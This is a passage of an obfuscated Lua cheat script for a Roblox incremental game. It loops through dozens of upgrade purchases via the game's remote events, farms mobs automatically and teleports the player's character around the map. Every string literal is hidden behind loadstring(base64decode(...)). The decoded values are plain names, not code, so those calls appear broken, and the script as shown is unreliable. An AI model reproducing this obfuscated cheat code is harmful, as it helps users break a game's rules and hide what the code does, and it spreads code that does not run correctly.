    add(autoAutomaticBlowingEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QnViYmxlcw=="))(), loadstring(base64decode("QXV0b21hdGljQmxvd2luZw=="))())
    add(autoComboDecayEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QnViYmxlcw=="))(), loadstring(base64decode("Q29tYm9EZWNheQ=="))())
    add(autoAutomaticBlowingSpeedEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QnViYmxlcw=="))(), loadstring(base64decode("QXV0b21hdGljQmxvd2luZ1NwZWVk"))())
    add(autoOofPowerBubblesEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QnViYmxlcw=="))(), loadstring(base64decode("T29mUG93ZXI="))())
    add(autoBaseAirEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QWly"))(), loadstring(base64decode("QmFzZUFpcg=="))())
    add(autoComboPowerAirEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QWly"))(), loadstring(base64decode("Q29tYm9Qb3dlcg=="))())
    add(autoBubblePowerAirEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QWly"))(), loadstring(base64decode("QnViYmxlUG93ZXI="))())
    add(autoCoralGrowthSpeedEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("Q29yYWw="))(), loadstring(base64decode("R3Jvd3RoU3BlZWQ="))())
    add(autoCoralValueEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("Q29yYWw="))(), loadstring(base64decode("Q29yYWxWYWx1ZQ=="))())
    add(autoOfflineGrowthMultiplierEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("Q29yYWw="))(), loadstring(base64decode("T2ZmbGluZUdyb3d0aE11bHRpcGxpZXI="))())
    add(autoBubblePowerCoralEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("Q29yYWw="))(), loadstring(base64decode("QnViYmxlUG93ZXI="))())
    add(autoOofPowerCoralEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("Q29yYWw="))(), loadstring(base64decode("T29mUG93ZXI="))())
    add(autoPrismPowerCoralEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("Q29yYWw="))(), loadstring(base64decode("UHJpc21Qb3dlcg=="))())
    
    -- Momentum Upgrades
    add(autoMoreMomentumEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("TW9tZW50dW0="))(), loadstring(base64decode("TW9yZU1vbWVudHVt"))())
    add(autoChariotStrengthEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("TW9tZW50dW0="))(), loadstring(base64decode("SG9yc2Vwb3dlcg=="))())
    add(autoChariotNoobPowerEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("TW9tZW50dW0="))(), loadstring(base64decode("Tm9vYlRyYWluaW5n"))())
    add(autoGloryPowerMomentumEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("TW9tZW50dW0="))(), loadstring(base64decode("R2xvcnlQb3dlcg=="))())
    add(autoChariotStrength2Enabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("TW9tZW50dW0="))(), loadstring(base64decode("ZUhvcnNlcG93ZXI="))())
    add(autoOofPowerMomentumEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("TW9tZW50dW0="))(), loadstring(base64decode("T29mUG93ZXI="))())
    add(autoGloryPower2MomentumEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("TW9tZW50dW0="))(), loadstring(base64decode("ZUdsb3J5UG93ZXI="))())
    add(autoChariotStrength3Enabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("TW9tZW50dW0="))(), loadstring(base64decode("ZWVIb3JzZXBvd2Vy"))())
    
    -- Glory Upgrades
    add(autoMoreGloryEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("R2xvcnk="))(), loadstring(base64decode("TW9yZUdsb3J5"))())
    add(autoColosseumHPEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("R2xvcnk="))(), loadstring(base64decode("Vml0YWxpdHk="))())
    add(autoColosseumDamageEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("R2xvcnk="))(), loadstring(base64decode("R2xhZGl1cw=="))())
    add(autoAttackSpeedEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("R2xvcnk="))(), loadstring(base64decode("QXR0YWNrU3BlZWQ="))())
    add(autoMomentumGloryEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("R2xvcnk="))(), loadstring(base64decode("TW9tZW50dW1Qb3dlcg=="))())
    add(autoColosseumDamage2Enabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("R2xvcnk="))(), loadstring(base64decode("R2xhZGl1czI="))())
    add(autoColosseumHP2Enabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("R2xvcnk="))(), loadstring(base64decode("Vml0YWxpdHky"))())
    add(autoBurdenGloryEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("R2xvcnk="))(), loadstring(base64decode("QnVyZGVuMw=="))())
    add(autoAuthorityMultiEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("R2xvcnk="))(), loadstring(base64decode("QXV0aG9yaXR5Mw=="))())

    -- Radiance Upgrades
    add(autoMoreRadianceEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UmFkaWFuY2U="))(), loadstring(base64decode("TW9yZVJhZGlhbmNl"))())
    add(autoEvenMoreRadianceEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UmFkaWFuY2U="))(), loadstring(base64decode("RXZlbk1vcmVSYWRpYW5jZQ=="))())
    add(autoOofsRadianceEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UmFkaWFuY2U="))(), loadstring(base64decode("U3VuQmxlc3Npbmc="))())
    add(autoTierLuckRadianceEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UmFkaWFuY2U="))(), loadstring(base64decode("VGllckx1Y2s="))())
    add(autoTheRadianceBalanceEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UmFkaWFuY2U="))(), loadstring(base64decode("Qk1vcmVSYWRpYW5jZQ=="))())
    add(autoMoreMoreRadianceEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UmFkaWFuY2U="))(), loadstring(base64decode("TW9yZU1vcmVSYWRpYW5jZQ=="))())
    add(autoMoreMomentumRadianceEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UmFkaWFuY2U="))(), loadstring(base64decode("TW9yZU1vbWVudHVt"))())
    add(autoStarlightPowerRadianceEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UmFkaWFuY2U="))(), loadstring(base64decode("U3RhcmxpZ2h0UG93ZXI="))())
    add(autoThunderPowerRadianceEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UmFkaWFuY2U="))(), loadstring(base64decode("VGh1bmRlclBvd2Vy"))())
    add(autoSuchAMomentRadianceEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UmFkaWFuY2U="))(), loadstring(base64decode("TW9tZW50dW1Qb3dlcg=="))())
    add(autoSuchABurdenRadianceEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UmFkaWFuY2U="))(), loadstring(base64decode("QnVyZGVuUG93ZXI="))())
    add(autoSuchAGloryRadianceEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UmFkaWFuY2U="))(), loadstring(base64decode("R2xvcnlQb3dlcg=="))())
    add(autoLookUpTheSkyRadianceEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UmFkaWFuY2U="))(), loadstring(base64decode("U3RhcmxpZ2h0UG93ZXI3"))())
    add(autoStarlightAgainRadianceEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UmFkaWFuY2U="))(), loadstring(base64decode("U3RhcmxpZ2h0UG93ZXI4"))())
    add(autoBurdenAgainRadianceEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UmFkaWFuY2U="))(), loadstring(base64decode("QnVyZGVuUG93ZXI3"))())

    -- Sun Pillars
    add(autoUpgradePillar1Enabled or autoAllPillarsEnabled, loadstring(base64decode("VXBncmFkZVN1blBpbGxhcg=="))(), 1)
    add(autoUpgradePillar2Enabled or autoAllPillarsEnabled, loadstring(base64decode("VXBncmFkZVN1blBpbGxhcg=="))(), 2)
    add(autoUpgradePillar3Enabled or autoAllPillarsEnabled, loadstring(base64decode("VXBncmFkZVN1blBpbGxhcg=="))(), 3)
    add(autoUpgradePillar4Enabled or autoAllPillarsEnabled, loadstring(base64decode("VXBncmFkZVN1blBpbGxhcg=="))(), 4)
    add(autoUpgradePillar5Enabled or autoAllPillarsEnabled, loadstring(base64decode("VXBncmFkZVN1blBpbGxhcg=="))(), 5)
    add(autoSunPillarRankEnabled, loadstring(base64decode("U3VuUGlsbGFyUmFua1Vw"))())

    -- Starlight Upgrades
    add(autoMoreStarlightEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3RhcmxpZ2h0"))(), loadstring(base64decode("TW9yZVN0YXJsaWdodA=="))())
    add(autoStellarRadianceEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3RhcmxpZ2h0"))(), loadstring(base64decode("U3RlbGxhclJhZGlhbmNl"))())
    add(autoMoreThunderEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3RhcmxpZ2h0"))(), loadstring(base64decode("TW9yZVRodW5kZXI="))())
    add(autoCosmicOofEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3RhcmxpZ2h0"))(), loadstring(base64decode("Q29zbWljT29m"))())
    add(autoRuneBulkStarlightEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3RhcmxpZ2h0"))(), loadstring(base64decode("UnVuZUxpZ2h0"))())
    add(autoAuthorityStarlightEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3RhcmxpZ2h0"))(), loadstring(base64decode("QXV0aG9yaXR5"))())
    add(autoMomentumStarlightEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3RhcmxpZ2h0"))(), loadstring(base64decode("TW9tZW50dW0="))())
    add(autoRadianceStarlightEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3RhcmxpZ2h0"))(), loadstring(base64decode("UmFkaWFuY2U3Nw=="))())
    add(autoStarlight77Enabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3RhcmxpZ2h0"))(), loadstring(base64decode("U3RhcmxpZ2h0Nzc="))())

    -- Thunder Upgrades
    add(autoMoreThunderUpgradesEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("VGh1bmRlcg=="))(), loadstring(base64decode("TW9yZVRodW5kZXI="))())
    add(autoThunderDamageEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("VGh1bmRlcg=="))(), loadstring(base64decode("VGh1bmRlckRhbWFnZQ=="))())
    add(autoLightningSpeedEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("VGh1bmRlcg=="))(), loadstring(base64decode("TGlnaHRuaW5nU3BlZWQ="))())
    add(autoWeakPointPowerEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("VGh1bmRlcg=="))(), loadstring(base64decode("V2Vha1BvaW50UG93ZXI="))())
    add(autoMoreRadianceThunderEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("VGh1bmRlcg=="))(), loadstring(base64decode("TW9yZVJhZGlhbmNl"))())
    add(autoMoreStarlightThunderEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("VGh1bmRlcg=="))(), loadstring(base64decode("TW9yZVN0YXJsaWdodA=="))())
    add(autoCronusNoobPowerEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("VGh1bmRlcg=="))(), loadstring(base64decode("Tm9vYkxpZ2h0bmluZw=="))())
    add(autoEverFeltOverpoweredEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("VGh1bmRlcg=="))(), loadstring(base64decode("TW9yZVRodW5kZXJC"))())
    add(autoMoreThunder2Enabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("VGh1bmRlcg=="))(), loadstring(base64decode("TW9yZVRodW5kZXI0"))())
    add(autoCronusRankUpEnabled, loadstring(base64decode("Q3JvbnVzUmFua1Vw"))())

    -- Authority Upgrades
    add(autoMoreAuthorityEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QXV0aG9yaXR5"))(), loadstring(base64decode("TW9yZUF1dGhvcml0eQ=="))())
    add(autoMoreBurdenAuthorityEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QXV0aG9yaXR5"))(), loadstring(base64decode("TW9yZUJ1cmRlbg=="))())
    add(autoMoreGloryAuthorityEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QXV0aG9yaXR5"))(), loadstring(base64decode("TW9yZUdsb3J5"))())
    add(autoMoreStarlightAuthorityEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QXV0aG9yaXR5"))(), loadstring(base64decode("TW9yZVN0YXJsaWdodA=="))())
    add(autoMoreThunderAuthorityEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QXV0aG9yaXR5"))(), loadstring(base64decode("TW9yZVRodW5kZXI="))())
    add(autoCouncilRankUpEnabled, loadstring(base64decode("Q291bmNpbFJhbmtVcA=="))())

    -- Halloween Upgrades
    add(autoMoreGhostsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("R2hvc3Q="))(), loadstring(base64decode("TW9yZUdob3N0cw=="))())
    add(autoSharperScytheEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("R2hvc3Q="))(), loadstring(base64decode("U2N5dGhlRGFtYWdl"))())
    add(autoFasterScythe2Enabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("R2hvc3Q="))(), loadstring(base64decode("U2N5dGhlU3BlZWQy"))())
    add(autoSoulLuckEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("R2hvc3Q="))(), loadstring(base64decode("U291bEx1Y2s="))())
    add(autoHMasteryXPEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("R2hvc3Q="))(), loadstring(base64decode("SGFsbG93ZWVuTWFzdGVyeVhQ"))())
    add(autoMoreSpookyOofGhostEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("R2hvc3Q="))(), loadstring(base64decode("TW9yZVNwb29reU9vZg=="))())

    add(autoSpookyOofMoreSpookyOofEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3Bvb2t5T29m"))(), loadstring(base64decode("TW9yZVNwb29reU9vZg=="))())
    add(autoSpookyOofMoreGhostsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3Bvb2t5T29m"))(), loadstring(base64decode("TW9yZUdob3N0cw=="))())
    add(autoFasterHNoobsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3Bvb2t5T29m"))(), loadstring(base64decode("RmFzdGVySGFsbG93ZWVuTm9vYnM="))())
    add(autoMorePumpkinsSpookyEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3Bvb2t5T29m"))(), loadstring(base64decode("TW9yZVB1bXBraW5z"))())
    add(autoMorePumpkinSpookyEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3Bvb2t5T29m"))(), loadstring(base64decode("TW9yZVB1bXBraW4="))())
    add(autoMoreSweets2SpookyEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3Bvb2t5T29m"))(), loadstring(base64decode("TW9yZVN3ZWV0cw=="))())
    add(autoMorePumpkinXP34Enabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3Bvb2t5T29m"))(), loadstring(base64decode("TW9yZVB1bXBraW5YUDM0"))())

    add(autoMoreSweetsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3dlZXRz"))(), loadstring(base64decode("TW9yZVN3ZWV0cw=="))())
    add(autoMoreSweets2Enabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3dlZXRz"))(), loadstring(base64decode("TW9yZVN3ZWV0czI="))())
    add(autoFasterHousesEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3dlZXRz"))(), loadstring(base64decode("RmFzdGVySG91c2Vz"))())
    add(autoSpecialLuckEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3dlZXRz"))(), loadstring(base64decode("U3BlY2lhbEx1Y2s="))())
    add(autoMorePumpkinSweetsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3dlZXRz"))(), loadstring(base64decode("TW9yZVB1bXBraW4="))())
    add(autoMoreGhostSweetsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3dlZXRz"))(), loadstring(base64decode("TW9yZUdob3N0"))())
    add(autoMoreSpookyOofSweetsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("U3dlZXRz"))(), loadstring(base64decode("TW9yZVNwb29reU9vZg=="))())

    add(autoMilestoneSpookyOofEnabled, loadstring(base64decode("RGVwb3NpdENhbmR5Q29ybk1pbGVzdG9uZQ=="))(), loadstring(base64decode("U3Bvb2t5T29m"))())
    add(autoMilestoneGhostsEnabled, loadstring(base64decode("RGVwb3NpdENhbmR5Q29ybk1pbGVzdG9uZQ=="))(), loadstring(base64decode("R2hvc3Q="))())
    add(autoMilestonePumpkinsEnabled, loadstring(base64decode("RGVwb3NpdENhbmR5Q29ybk1pbGVzdG9uZQ=="))(), loadstring(base64decode("UHVtcGtpbg=="))())
    add(autoMilestoneSweetsEnabled, loadstring(base64decode("RGVwb3NpdENhbmR5Q29ybk1pbGVzdG9uZQ=="))(), loadstring(base64decode("U3dlZXRz"))())
    add(autoMilestoneHRuneLuckEnabled, loadstring(base64decode("RGVwb3NpdENhbmR5Q29ybk1pbGVzdG9uZQ=="))(), loadstring(base64decode("SGFsbG93ZWVuUnVuZUx1Y2s="))())
    add(autoMilestoneHRuneBulkEnabled, loadstring(base64decode("RGVwb3NpdENhbmR5Q29ybk1pbGVzdG9uZQ=="))(), loadstring(base64decode("SGFsbG93ZWVuUnVuZUJ1bGs="))())
    add(autoMilestoneCandyCornEnabled, loadstring(base64decode("RGVwb3NpdENhbmR5Q29ybk1pbGVzdG9uZQ=="))(), loadstring(base64decode("Q2FuZHlDb3Ju"))())

    add(autoPumpkinMorePumpkinsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UHVtcGtpbg=="))(), loadstring(base64decode("TW9yZVB1bXBraW5z"))())
    add(autoPumpkinEvenMorePumpkinsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UHVtcGtpbg=="))(), loadstring(base64decode("TW9yZVB1bXBraW5zMg=="))())
    add(autoPumpkinFasterGrowthEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UHVtcGtpbg=="))(), loadstring(base64decode("RmFzdGVyR3Jvd3Ro"))())
    add(autoPumpkinMorePumpkinXPEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UHVtcGtpbg=="))(), loadstring(base64decode("TW9yZVB1bXBraW5YUA=="))())
    add(autoPumpkinMoreSpookyOofEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("UHVtcGtpbg=="))(), loadstring(base64decode("TW9yZVNwb29reU9vZg=="))())
    add(autoHarvestPumpkinsEnabled, loadstring(base64decode("SGFydmVzdFB1bXBraW5z"))())

    add(autoSpookyOofMilestoneUpEnabled, loadstring(base64decode("U3Bvb2t5T29mTWlsZXN0b25lVXA="))())

    add(autoChariotRankUpEnabled, loadstring(base64decode("Q2hhcmlvdFJhbmtVcA=="))())
    add(autoKickEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("R29hbHM="))(), loadstring(base64decode("QXV0b0tpY2s="))())
    add(autoMoreGoalsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("R29hbHM="))(), loadstring(base64decode("TW9yZUdvYWxz"))())
    add(autoRuneBulkEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("R29hbHM="))(), loadstring(base64decode("UnVuZUJ1bGs="))())
    add(autoRuneLuckEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("R29hbHM="))(), loadstring(base64decode("UnVuZUx1Y2s="))())
    add(autoFootballRankingEnabled, loadstring(base64decode("QnV5Rm9vdGJhbGxSYW5raW5n"))(), 1)
    return list
end

task.spawn(function()
    while true do
        local list = collectEnabledUpgrades()
        if #list == 0 then
            task.wait(0.4)
        else
            for _, args in ipairs(list) do
                fireMain(unpack(args))
                task.wait(upgradeSeqDelay)
            end
            task.wait(0.15)
        end
    end
end)

-- Dedicated Throw Lightning Loop
task.spawn(function()
    while true do
        if autoThrowLightningZeusEnabled then
            fireMain(loadstring(base64decode("VGhyb3dMaWdodG5pbmc="))(), loadstring(base64decode("TGVmdCBBcm0="))())
            task.wait(lightningThrowDelay)
        else
            task.wait(0.5)
        end
    end
end)

-- Dedicated Auto Reaper Noobs Loop (Waits until current mob is dead before moving to next)
task.spawn(function()
    while true do
        if autoAutoReaperNoobsEnabled then
            local reaperFolder = workspace:FindFirstChild(loadstring(base64decode("UmVhcGVyTm9vYnM="))())
            if reaperFolder then
                local targetMob = nil
                local targetHumanoid = nil
                local targetRoot = nil

                -- Find first valid alive mob
                for _, mob in ipairs(reaperFolder:GetChildren()) do
                    if mob:IsA(loadstring(base64decode("TW9kZWw="))()) then
                        local root = mob:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) or mob.PrimaryPart or mob:FindFirstChildWhichIsA(loadstring(base64decode("QmFzZVBhcnQ="))())
                        local hum = mob:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
                        if root and hum and hum.Health > 0 then
                            targetMob = mob
                            targetHumanoid = hum
                            targetRoot = root
                            break
                        end
                    end
                end

                if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
                    -- Move/Teleport to the mob
                    moveTo(targetRoot.Position, reaperMobSpeed, useTweenReaperMobs)
                    
                    -- Stay locked onto this mob until its health is 0 or it gets destroyed
                    while autoAutoReaperNoobsEnabled and targetHumanoid and targetHumanoid.Health > 0 and targetRoot and targetRoot.Parent do
                        moveTo(targetRoot.Position, reaperMobSpeed, useTweenReaperMobs)
                        task.wait(0.2)
                    end
                    task.wait(0.2)
                else
                    task.wait(0.5)
                end
            else
                task.wait(1.0)
            end
        else
            task.wait(0.5)
        end
    end
end)

local function getCurrentTrialWave()
    local wave = 0
    pcall(function()
        local waveCount = player.PlayerGui.FullScreen.Popups.TrialUI.Info.WaveCount
        if waveCount then
            if waveCount:IsA(loadstring(base64decode("VGV4dExhYmVs"))()) or waveCount:IsA(loadstring(base64decode("VGV4dEJ1dHRvbg=="))()) then
                wave = tonumber(waveCount.Text) or 0
            elseif waveCount:IsA(loadstring(base64decode("VmFsdWVCYXNl"))()) then
                wave = tonumber(waveCount.Value) or 0
            else
                wave = tonumber(tostring(waveCount)) or 0
            end
        end
    end)
    return wave
end

local function getCurrentSandLayer()
    local root = getRoot()
    if not root then return 0 end
    local folder = workspace:FindFirstChild(loadstring(base64decode("R2VuZXJhdGVkU2FuZExheWVycw=="))())
    if not folder then return 0 end
    local playerY = root.Position.Y
    local closest, closestDiff = 0, math.huge
    for _, model in ipairs(folder:GetChildren()) do
        if model:IsA(loadstring(base64decode("TW9kZWw="))()) then
            local index = model:GetAttribute(loadstring(base64decode("TGF5ZXJJbmRleA=="))())
            if typeof(index) == loadstring(base64decode("bnVtYmVy"))() then
                local part = model.PrimaryPart or model:FindFirstChild(loadstring(base64decode("Rmxvb3I="))()) or model:FindFirstChild(loadstring(base64decode("QmFzZQ=="))()) or model:FindFirstChildWhichIsA(loadstring(base64decode("QmFzZVBhcnQ="))())
                if part then
                    local diff = math.abs(playerY - part.Position.Y)
                    if diff < closestDiff then
                        closestDiff = diff
                        closest = index
                    end
                end
            end
        end
    end
    return closest
end

local function teleportToResetSand()
    local root = getRoot()
    if not root then return end
    pcall(function()
        local resetBtn = workspace.__GAME_CONTENT.Upgrades.Sand.Upgrades.ResetSandLayerButton.Reset_Sand_Layer
        if resetBtn and resetBtn:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
            root.CFrame = CFrame.new(resetBtn.Position + Vector3.new(0, 5, 0))
        end
    end)
end

local function teleportToSandTop()
    local root = getRoot()
    if not root then return end
    local ok = pcall(function()
        local title = workspace.__GAME_CONTENT.Contents[loadstring(base64decode("V09STEQgLSAz"))()].SandLayer.SandTitle
        if title and title:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
            root.CFrame = CFrame.new(title.Position + Vector3.new(0, 5, 0))
        end
    end)
    if not ok then fireMain(loadstring(base64decode("QmFja1RvU3VyZmFjZQ=="))()) end
end

local function getDoorPosition()
    local ok, pos = pcall(function()
        local trials = workspace.__GAME_CONTENT.Contents[loadstring(base64decode("V09STEQgLSAz"))()].Trials
        local room = trials:FindFirstChild(selectedTrial .. loadstring(base64decode("VHJpYWxSb29t"))())
        if not room then return nil end
        local doorFolder = room:FindFirstChild(loadstring(base64decode("X19UcmlhbA=="))() .. selectedTrial .. loadstring(base64decode("Um9vbQ=="))())
        if doorFolder and doorFolder:FindFirstChild(loadstring(base64decode("VG91Y2hQYXJ0"))()) then
            return doorFolder.TouchPart.Position
        end
        local touch = room:FindFirstChild(loadstring(base64decode("VG91Y2hQYXJ0"))(), true)
        if touch then return touch.Position end
        return nil
    end)
    return ok and pos or nil
end

local function getAliveTrialMobs()
    local mobs = {}
    pcall(function()
        local room = workspace.__GAME_CONTENT.Contents[loadstring(base64decode("V09STEQgLSAz"))()].Trials[selectedTrial .. loadstring(base64decode("VHJpYWxSb29t"))()]
        local mobsFolder = room and room:FindFirstChild(loadstring(base64decode("TW9icw=="))())
        if not mobsFolder then return end
        for _, mobModel in ipairs(mobsFolder:GetChildren()) do
            local rootPart, humanoid = nil, nil
            local mobChar = mobModel:FindFirstChild(loadstring(base64decode("TW9iQ2hhcmFjdGVy"))())
            if mobChar then
